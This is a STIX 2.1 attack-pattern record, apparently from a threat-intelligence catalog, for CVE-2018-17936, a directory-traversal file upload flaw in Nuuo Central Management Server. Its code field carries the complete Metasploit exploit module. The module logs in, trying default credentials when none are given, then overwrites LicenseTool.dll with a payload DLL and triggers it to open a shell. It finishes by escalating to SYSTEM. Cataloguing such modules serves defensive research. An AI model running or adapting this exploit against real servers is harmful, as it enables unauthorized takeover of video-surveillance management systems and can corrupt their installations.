{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--628f31c6-9023-4bb0-8da5-80251fcc85b5",
    "created": "2024-08-14T16:35:19.073823Z",
    "modified": "2024-08-14T16:35:19.073827Z",
    "name": "\"Nuuo Central Management Server Authenticated Arbitrary File Upload\"",
    "description": " The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the CMS Server. The vulnerability is in the \"FileName\" parameter, which accepts directory traversal (..\\..\\) characters. Therefore, this function can be abused to overwrite any files in the installation drive of CMS Server.  This vulnerability is exploitable in CMS versions up to and including v2.4.  This module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided.  This module will overwrite the LicenseTool.dll file in the CMS Server installation. If the module fails to restore LicenseTool.dll then the installation will be corrupted and NCS Server will not execute successfully.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/nuuo/nuuo_cms_fu.rb",
            "external_id": "nuuo_cms_fu.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17936"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jan/51"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::Nuuo\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Nuuo Central Management Server Authenticated Arbitrary File Upload\",\n        'Description' => %q{\n          The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the\n          CMS Server.\n          The vulnerability is in the \"FileName\" parameter, which accepts directory traversal (..\\..\\)\n          characters. Therefore, this function can be abused to overwrite any files in the installation\n          drive of CMS Server.\n\n          This vulnerability is exploitable in CMS versions up to and including v2.4.\n\n          This module will either use a provided session number (which can be guessed with an auxiliary\n          module) or attempt to login using a provided username and password - it will also try the\n          default credentials if nothing is provided.\n\n          This module will overwrite the LicenseTool.dll file in the CMS Server installation. If the module\n          fails to restore LicenseTool.dll then the installation will be corrupted and NCS Server will\n          not execute successfully.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib@gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2018-17936' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-284-02' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt' ]\n        ],\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'Targets' => [\n          [ 'Nuuo Central Management Server <= v2.4.0', {} ],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2018-10-11',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(client)\n    if client.type == 'meterpreter'\n      print_warning('Please wait a bit while we clean up')\n      client.sys.process.get_processes().each do |proc|\n        if proc['name'] == 'NCS_Server.exe'\n          client.sys.process.kill(proc['pid'])\n          Rex.sleep(5)\n          client.shell_command_token(\"move /y #{@dll} LicenseTool.dll\")\n          client.sys.process.execute('NCS_Server.exe')\n          print_good('Successfully restored LicenseTool.dll!')\n        end\n      end\n\n      # elevate privs to system (we're already Admin anyway), and we're done!\n      client.run_cmd('getsystem')\n      print_good('We should have SYSTEM now, enjoy your shell!')\n    else\n      print_error('You are not using meterpreter, so we are unable to restore LicenseTool.dll')\n      print_error(\"To restore it, kill the NCS_Server.exe process and copy <CMS_FOLDER>\\\\#{@dll} to <CMS_FOLDER>\\\\LicenseTool.dll\")\n      print_error('... otherwise the Nuuo CMS installation will be nuked!')\n      print_good('Anyway, enjoy your shell!')\n    end\n  end\n\n  def upload_file(filename, data)\n    res = ncs_send_request({\n      'method' => 'COMMITCONFIG',\n      'file_name' => \"..\\\\..\\\\#{filename}\",\n      'user_session' => user_session,\n      'data' => data\n    })\n  end\n\n  def exploit\n    connect\n    res = ncs_login\n    fail_with(Failure::NoAccess, 'Failed to login to Nuuo CMS') unless res\n\n    # Download and upload a backup of LicenseTool.dll, so that we can restore it at post\n    # and not nuke the CMS installation.\n    @dll = rand_text_alpha(12)\n    print_status(\"Backing up LicenseTool.dll to #{@dll}\")\n\n    ltool = 'LicenseTool.dll'\n    res = ncs_send_request({\n      'method' => 'GETCONFIG',\n      'file_name' => \"..\\\\..\\\\#{ltool}\",\n      'user_session' => user_session\n    })\n    dll_data = res.body\n\n    upload_file(@dll, dll_data)\n\n    print_status('Uploading payload...')\n    upload_file(ltool, generate_payload_dll)\n\n    print_status('Sleeping 15 seconds...')\n    Rex.sleep(15)\n\n    print_status('Sending SENDLICFILE request, shell incoming!')\n    res = ncs_send_request({\n      'method' => 'SENDLICFILE',\n      'file_name' => \"#{rand_text_alpha(3..11)}.lic\",\n      'user_session' => user_session,\n      'data' => rand_text_alpha(50..350)\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-11",
    "x_mitre_platforms": [
        "win'"
    ]
}